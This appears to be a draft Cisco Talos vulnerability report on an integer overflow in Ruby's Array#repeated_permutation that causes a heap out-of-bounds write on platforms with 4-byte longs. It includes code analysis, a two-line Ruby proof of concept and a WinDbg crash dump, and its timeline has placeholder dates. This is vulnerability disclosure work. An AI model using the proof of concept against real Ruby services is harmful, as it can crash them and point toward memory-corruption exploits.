Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby Array.repeated_permutation "rb_ary_repeated_permutation" function Integer overflow vulernability.

:: Description

Integer overflow occurs during calculation size of buffer for result of repeated permutation in rb_ary_repeated_permutation function of Ruby programming language. Properly choosen repeated permutation length "n" (represented by "r" variable in code")
of the elements of the Array can cause integer overflow. In consequences buffer keeping results of mentioned operation is too small and further out of bound write occurs.
 

:: Tested Versions

Ruby 2.3.0 dev
* Should works on all 32 bit platforms and those x64 platforms where long size is eq 4 . e.g Windows

:: Product URLs

https://www.ruby-lang.org


:: Details

Code analysis:
5135	static VALUE
5136	rb_ary_repeated_permutation(VALUE ary, VALUE num)
5137	{
5138		long r, n, i;
5139	
5140		n = RARRAY_LEN(ary);                  /* Array length */
5141		RETURN_SIZED_ENUMERATOR(ary, 1, &num, rb_ary_repeated_permutation_size);      /* Return Enumerator if no block */
5142		r = NUM2LONG(num);                    /* Permutation size from argument */
5143	
5144		if (r < 0) {
5145			/* no permutations: yield nothing */
5146		}
5147		else if (r == 0) { /* exactly one permutation: the zero-length array */
5148			rb_yield(rb_ary_new2(0));
5149		}
5150		else if (r == 1) { /* this is a special, easy case */
5151			for (i = 0; i < RARRAY_LEN(ary); i++) {
5152				rb_yield(rb_ary_new3(1, RARRAY_AREF(ary, i)));
5153			}
5154		}
5155		else {             /* this is the general case */
5156			volatile VALUE t0;
>5157			long *p = ALLOCV_N(long, t0, r * sizeof(long));
5158			VALUE ary0 = ary_make_shared_copy(ary); /* private defensive copy of ary */
5159			RBASIC_CLEAR_CLASS(ary0);
5160	
>5161			rpermute0(n, r, p, ary0); /* compute and yield repeated permutations */

In line 5157 we have the following calculation : 
r * sizeof(long))
where:
r - number of repeated permutation passed as argument
Assuming that type long is 4 byte long and "r" equals 0x40000000 we obtain above formula in that form:
0x40000000 * 4 = 0x0
As You can see integer overflow occurs and result of calculation is 0 which is pased to ALLOCV_N as allocation size argument.
For 0 ALLOCV_N allocates legit buffer but not big enought to handle array write operation in rpermute0 function to array pointed by "p" pointer depends on "r" value.

5074	static void
5075	rpermute0(const long n, const long r, long *const p, const VALUE values)
5076	{
5077		long i = 0, index = 0;
5078	
5079		p[index] = i;
5080		for (;;) {
5081			if (++index < r-1) {
>5082				p[index] = i = 0;
5083				continue;

Line 5082 presents place where out of bound write will occure.



:: PoC

Code which triggers this vulnerability
---------------------------------- PoC test.rb ----------------------------------------
a = [1,2,3]
a.repeated_permutation(0x40000000){|x|}
---------------------------------- PoC test.rb ----------------------------------------



:: Crash analysis

*******************************************************************************
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** WARNING: Unable to verify checksum for ruby.exe

FAULTING_IP: 
x64_msvcr120_ruby230!rb_ary_repeated_permutation+19b [ruby-2.2.1\array.c @ 5149]
000007fe`e12ae1e3 438324b700      and     dword ptr [r15+r14*4],0

EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 000007fee12ae1e3 (x64_msvcr120_ruby230!rb_ary_repeated_permutation+0x000000000000019b)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000001
   Parameter[1]: 000000000332e000
Attempt to write to address 000000000332e000

FAULTING_THREAD:  00000000000023f8

DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE

PROCESS_NAME:  ruby.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  0000000000000001

EXCEPTION_PARAMETER2:  000000000332e000

WRITE_ADDRESS:  000000000332e000 

FOLLOWUP_IP: 
x64_msvcr120_ruby230!rb_ary_repeated_permutation+19b [t:\projects\bugs\ruby-2.2.1\array.c @ 5149]
000007fe`e12ae1e3 438324b700      and     dword ptr [r15+r14*4],0

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  ruby.exe

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE

LAST_CONTROL_TRANSFER:  from 000007fee1299817 to 000007fee12ae1e3

STACK_TEXT:  
00000000`0053ca30 000007fe`e1299817 : 00000000`00658b60 00000000`0307a028 00000000`0204d090 00000000`00000001 : x64_msvcr120_ruby230!rb_ary_repeated_permutation+0x19b
00000000`0053cab0 000007fe`e1299ce8 : 00000000`0070de10 00000000`0083faa0 00000000`03231b50 00000000`00000000 : x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x133
00000000`0053cba0 000007fe`e129cd7f : 00000000`03231b50 00000000`00000014 00000000`00000014 00000000`0083faa0 : x64_msvcr120_ruby230!vm_call_general+0x424
00000000`0053cc70 000007fe`e129b8ff : 00000000`00658b60 00000000`00658b60 00000000`03079e98 000007fe`e12eb2dc : x64_msvcr120_ruby230!vm_exec_core+0xf7f
00000000`0053cf00 000007fe`e12914f7 : 00000000`0053d1a0 00000000`00658b60 00000000`00000008 00000000`029fad38 : x64_msvcr120_ruby230!vm_exec+0xaf
00000000`0053d130 000007fe`e129474c : 00000000`029f8498 00000000`00740240 000007fe`e1383a58 00000000`0053d3b0 : x64_msvcr120_ruby230!eval_string_with_cref+0x37b
00000000`0053d370 000007fe`e1299817 : 00000000`00658b60 00000000`0053d469 00000000`01ff2090 00000000`029eb360 : x64_msvcr120_ruby230!rb_f_eval+0xbc
00000000`0053d3e0 000007fe`e129cd7f : 00000000`0071ead0 00000000`0083fb40 00000000`02f93630 00000000`0083fb90 : x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x133
00000000`0053d4d0 000007fe`e129b8ff : 00000000`00658b60 00000000`00658b60 00000000`00640000 00000000`50000063 : x64_msvcr120_ruby230!vm_exec_core+0xf7f
00000000`0053d760 000007fe`e1291c8b : 00000000`00658b60 00000000`00658b60 00000000`00000000 00000000`031c2660 : x64_msvcr120_ruby230!vm_exec+0xaf
00000000`0053d990 000007fe`e12977b3 : 00000000`00000000 000007fe`00000000 00000000`01ff31d0 00000000`00000000 : x64_msvcr120_ruby230!invoke_block_from_c+0x26f
00000000`0053da90 000007fe`e1292071 : 00000000`02950e50 000007fe`e1291fd8 00000000`02951df0 00000000`00002000 : x64_msvcr120_ruby230!rb_yield_0+0x5f
00000000`0053daf0 000007fe`e1256719 : 00000000`0053db88 00000000`03122ac0 00000000`0053db88 000007fe`e12cff0d : x64_msvcr120_ruby230!loop_i+0xd
00000000`0053db20 000007fe`e12948bc : 00000000`032dc5b0 00000000`775c1577 00000000`00640000 00000000`00000000 : x64_msvcr120_ruby230!rb_rescue2+0xe1
00000000`0053dcf0 000007fe`e1299817 : 00000000`00658b60 00000000`01ff31d0 00000000`00000038 000007fe`e1285bf1 : x64_msvcr120_ruby230!rb_f_loop+0x64
00000000`0053dd30 000007fe`e1299ce8 : 00000000`0071ead0 00000000`0083fd70 00000000`0291fc10 00000000`00658b60 : x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x133
00000000`0053de20 000007fe`e129cd7f : 00000000`0291fc10 00000000`00000014 00000000`00000014 00000000`0083fd70 : x64_msvcr120_ruby230!vm_call_general+0x424
00000000`0053def0 000007fe`e129b8ff : 00000000`00658b60 00000000`00658b60 00000000`0083fd20 00000000`029f85b0 : x64_msvcr120_ruby230!vm_exec_core+0xf7f
00000000`0053e180 000007fe`e1291c8b : 00000000`00658b60 00000000`00658b60 00000000`00000000 00000000`031c21d0 : x64_msvcr120_ruby230!vm_exec+0xaf
00000000`0053e3b0 000007fe`e12977b3 : 00000000`00000000 00000000`00000000 00000000`00000008 00000000`ffffffff : x64_msvcr120_ruby230!invoke_block_from_c+0x26f
00000000`0053e4b0 000007fe`e1290be8 : 00000000`00740120 00000000`00000000 00000000`00000000 00000000`02f627f8 : x64_msvcr120_ruby230!rb_yield_0+0x5f
00000000`0053e510 000007fe`e1293d22 : 00000000`00bcfb0c 00000000`00658b60 00000000`00658b60 00000000`00000008 : x64_msvcr120_ruby230!catch_i+0x18
00000000`0053e540 000007fe`e1293c26 : 00000000`01ff2cc0 00000000`ffffffff 00000000`01ff2c10 00000000`0053e809 : x64_msvcr120_ruby230!rb_catch_protect+0xce
00000000`0053e720 000007fe`e129468b : 00000000`00000000 00000000`007400f0 000007fe`e137e808 00000000`0053e790 : x64_msvcr120_ruby230!rb_catch_obj+0xe
00000000`0053e750 000007fe`e1299817 : 00000000`00658b60 00000000`01ff2c10 00000000`00bcfb0c 00000000`775c1577 : x64_msvcr120_ruby230!rb_f_catch+0x43
00000000`0053e780 000007fe`e1299ce8 : 00000000`0071ead0 00000000`0083fe10 00000000`031c3038 00000000`00000003 : x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x133
00000000`0053e870 000007fe`e129cd7f : 00000000`031c3038 00000000`00000014 00000000`00000014 00000000`0083fe10 : x64_msvcr120_ruby230!vm_call_general+0x424
00000000`0053e940 000007fe`e129b8ff : 00000000`00658b60 00000000`00658b60 00000000`eb0400ef 00000000`00640000 : x64_msvcr120_ruby230!vm_exec_core+0xf7f
00000000`0053ebd0 000007fe`e1291c8b : 00000000`00658b60 00000000`00658b60 00000000`00000000 00000000`03134570 : x64_msvcr120_ruby230!vm_exec+0xaf
00000000`0053ee00 000007fe`e12977b3 : 00000000`00000000 00000000`00000000 00000000`00000008 00000000`ffffffff : x64_msvcr120_ruby230!invoke_block_from_c+0x26f
00000000`0053ef00 000007fe`e1290be8 : 00000000`776403d0 00000000`00000000 00000000`00000000 00000000`00640000 : x64_msvcr120_ruby230!rb_yield_0+0x5f
00000000`0053ef60 000007fe`e1293d22 : 00000000`00a33b0c 00000000`7757fc38 00000000`00640000 00000000`032e8de0 : x64_msvcr120_ruby230!catch_i+0x18
00000000`0053ef90 000007fe`e1293c26 : 00000000`01ff2cc0 00000000`ffffffff 00000000`01ff2c10 00000000`0053f259 : x64_msvcr120_ruby230!rb_catch_protect+0xce
00000000`0053f170 000007fe`e129468b : 00000000`00000000 00000000`00740090 000007fe`e137e808 00000000`0053f1e0 : x64_msvcr120_ruby230!rb_catch_obj+0xe
00000000`0053f1a0 000007fe`e1299817 : 00000000`00658b60 00000000`01ff2c10 00000000`00a33b0c 00000000`ffffffff : x64_msvcr120_ruby230!rb_f_catch+0x43
00000000`0053f1d0 000007fe`e1299ce8 : 00000000`0071ead0 00000000`0083ff50 00000000`03135bb0 000007fe`e1284da2 : x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x133
00000000`0053f2c0 000007fe`e129cd7f : 00000000`03135bb0 00000000`00000014 00000000`00000014 00000000`0083ff50 : x64_msvcr120_ruby230!vm_call_general+0x424
00000000`0053f390 000007fe`e129b8ff : 00000000`00658b60 00000000`00658b60 00000000`006f5450 00000000`006f54a0 : x64_msvcr120_ruby230!vm_exec_core+0xf7f
00000000`0053f620 000007fe`e1294e4d : 00000000`00000001 00000000`030fae58 00000000`02838190 00000000`00658b60 : x64_msvcr120_ruby230!vm_exec+0xaf
00000000`0053f850 000007fe`e1256f86 : 00000000`030fae58 00000000`00000000 00000000`030fae58 00000000`00000000 : x64_msvcr120_ruby230!rb_iseq_eval_main+0x81
00000000`0053f880 000007fe`e1256fdd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : x64_msvcr120_ruby230!ruby_exec_internal+0xc6
00000000`0053fa30 000007fe`e125727c : 00000000`030fae58 00000001`3f542158 00003e69`80a9b64a 00000000`00000000 : x64_msvcr120_ruby230!ruby_exec_node+0x1d
00000000`0053fa60 00000001`3f541040 : 01d08972`348b2edc 00000000`00000000 00000000`00000000 00000000`00000000 : x64_msvcr120_ruby230!ruby_run_node+0x30
00000000`0053fa90 00000001`3f5412a7 : 00000000`00000002 00000000`00656c60 00000000`00000000 00000000`00000000 : ruby!main+0x40
00000000`0053fac0 00000000`774259cd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ruby!__tmainCRTStartup+0x10f
00000000`0053faf0 00000000`7755b891 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0xd
00000000`0053fb20 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x1d


FAULTING_SOURCE_LINE:  ruby-2.2.1\array.c

FAULTING_SOURCE_FILE:  ruby-2.2.1\array.c

FAULTING_SOURCE_LINE_NUMBER:  5149

FAULTING_SOURCE_CODE:  
  5145: 	long *p = ALLOCV_N(long, t0, r * sizeof(long));
  5146: 	VALUE ary0 = ary_make_shared_copy(ary); /* private defensive copy of ary */
  5147: 	RBASIC_CLEAR_CLASS(ary0);
  5148: 
> 5149: 	rpermute0(n, r, p, ary0); /* compute and yield repeated permutations */
  5150: 	ALLOCV_END(t0);
  5151: 	RBASIC_SET_CLASS_RAW(ary0, rb_cArray);
  5152:     }
  5153:     return ary;
  5154: }


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  x64_msvcr120_ruby230!rb_ary_repeated_permutation+19b

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: x64_msvcr120_ruby230

IMAGE_NAME:  x64-msvcr120-ruby230.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  554b4a5a

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_x64-msvcr120-ruby230.dll!rb_ary_repeated_permutation

BUCKET_ID:  X64_APPLICATION_FAULT_INVALID_POINTER_WRITE_x64_msvcr120_ruby230!rb_ary_repeated_permutation+19b

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/ruby_exe/2_3_0_0/554b4a5b/x64-msvcr120-ruby230_dll/2_3_0_0/554b4a5a/c0000005/0005e1e3.htm?Retriage=1

Followup: MachineOwner
---------

Details:

0:000> r r15d  // == p
r15d=3079c78
0:000> !address r15d


Usage:                  Heap
Base Address:           00000000`02ee0000
End Address:            00000000`032e0000
Region Size:            00000000`00400000
State:                  00001000	MEM_COMMIT
Protect:                00000004	PAGE_READWRITE
Type:                   00020000	MEM_PRIVATE
Allocation Base:        00000000`02ee0000
Allocation Protect:     00000004	PAGE_READWRITE
More info:              heap owning the address: !heap 0x640000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x3079c78


0:000> !heap -x 0x3079c78
Entry             User              Heap              Segment               Size  PrevSize  Unused    Flags
-------------------------------------------------------------------------------------------------------------
0000000003075810  0000000003075820  0000000000640000  0000000002ee0000      8010        20        31  busy extra fill 

0:000> r ecx // == r
ecx=3fffffff

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-05-10 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure